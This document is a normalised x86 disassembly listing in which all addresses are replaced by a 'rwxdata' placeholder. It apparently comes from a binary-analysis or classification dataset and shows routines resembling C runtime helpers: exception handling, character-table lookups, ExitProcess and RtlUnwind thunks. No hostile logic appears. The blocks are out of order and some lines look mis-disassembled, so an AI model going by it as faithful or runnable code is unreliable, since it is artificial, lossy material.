and [ ebp + 0xa ] 0x0
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
push 0x2
jmp rwxdata
mov eax [ rwxdata ]
mov al [ eax + ebx * 2 ]
and eax 0x2
push 0x2
push ebx
call sub_40a2cc
pop ecx
pop ecx
jmp rwxdata
sub eax 0x20
jmp rwxdata
mov eax ebx
jmp rwxdata
cmp eax 0x1
jne rwxdata
pop eax
lea ecx [ ebp - 0x4 ]
push 0x1
push 0x0
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push 0x200
push [ rwxdata ]
call sub_409e68
add esp 0x20
test eax eax
je rwxdata
test eax eax
jne rwxdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp rwxdata
sub_40a2cc
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax + 0x1 ]
cmp ecx 0x100
ja rwxdata
mov ecx eax
push esi
mov esi [ rwxdata ]
sar ecx 0x8
movzx edx cl
test [ esi + edx * 2 + 0x1 ] 0x80
pop esi
je rwxdata
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
jmp rwxdata
and [ ebp - 0x3 ] 0x0
mov [ ebp - 0x4 ] al
push 0x1
and [ ebp - 0x2 ] 0x0
mov [ ebp - 0x4 ] cl
mov [ ebp - 0x3 ] al
push 0x2
jmp rwxdata
and eax [ ebp + 0xc ]
leave
retn
movzx eax [ ebp + 0xa ]
leave
retn
pop eax
lea ecx [ ebp + 0xa ]
push 0x1
push 0x0
push 0x0
push ecx
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
call sub_40a0b7
add esp 0x1c
test eax eax
jne rwxdata
sub_402a0b
cmpsb [ esi ] [ edi ]
hlt
sub_405757
[ eax ]
sub_405a30
mov eax [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
mov cl [ eax ]
mov dl [ esi ]
mov [ eax ] dl
mov [ esi ] cl
pop esi
retn
sub_405f46
cmp [ rwxdata ] 0x1
jne rwxdata
push [ esp + 0x4 ]
call sub_407891
pop ecx
push 0xff
call [ ExitProcess@IAT ]
call sub_407858
sub_4068bb
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
retn
sub_4068c8
mov eax [ esp + 0x4 ]
add [ eax ] 0x8
mov ecx [ eax ]
mov eax [ ecx - 0x8 ]
mov edx [ ecx - 0x4 ]
retn
sub_4068d8
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
retn
sub_406ac4
push 0x1
call sub_406acd
pop ecx
retn
sub_406bdf
call sub_406ac4
cmp [ rwxdata ] 0x0
je rwxdata
retn
jmp sub_408fc0
sub_406bf3
mov eax [ rwxdata ]
test eax eax
je rwxdata
push rwxdata
push rwxdata
call sub_406cdb
push rwxdata
push rwxdata
call sub_406cdb
add esp 0x10
retn
call eax
sub_406c20
push 0x0
push 0x0
push [ esp + 0xc ]
call sub_406c42
add esp 0xc
retn
sub_406c31
push 0x0
push 0x1
push [ esp + 0xc ]
call sub_406c42
add esp 0xc
retn
sub_4076a8
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je rwxdata
retn
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_407732
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_4076a8
jne rwxdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne rwxdata
mov eax 0x1
sub_40775e
push ebx
push ecx
mov ebx rwxdata
mov ecx [ ebp + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
pop ecx
pop ebx
retn 0x4
sub_40783d
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
mov eax [ ecx + 0x1c ]
push eax
mov eax [ ecx + 0x18 ]
push eax
call sub_4076ca
add esp 0x8
pop ebp
retn 0x4
sub_407c6f
mov eax [ esp + 0x4 ]
cmp eax [ rwxdata ]
jb rwxdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rwxdata ]
mov al [ ecx + eax * 8 + 0x4 ]
and eax 0x40
retn
xor eax eax
retn
sub_407d1b
push [ rwxdata ]
push [ esp + 0x8 ]
call sub_407d2d
pop ecx
pop ecx
retn
sub_409018
push 0x4
push 0x0
push [ esp + 0xc ]
call sub_409029
add esp 0xc
retn
sub_40941e
cmp [ rwxdata ] 0x0
jne rwxdata
retn
push 0xfffffffd
call sub_40905a
pop ecx
mov [ rwxdata ] 0x1
sub_409530
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_409547
add esp 0x10
retn
sub_409a9e
push 0x2
call sub_405f21
pop ecx
retn
sub_409f78
push 0x1
pop eax
retn
sub_40a02c
push 0x1
pop eax
retn
sub_40a1b0
push 0x1
pop eax
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
